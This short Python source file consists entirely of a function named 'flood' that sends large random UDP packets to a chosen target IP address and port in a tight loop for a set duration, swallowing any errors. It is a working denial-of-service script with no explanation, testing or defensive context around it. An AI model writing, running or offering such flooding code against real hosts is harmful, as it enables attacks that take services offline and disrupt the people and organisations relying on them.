import socket
import random
import time

def flood(target_ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            sock.sendto(bytes, (target_ip, port))
        except:
            pass
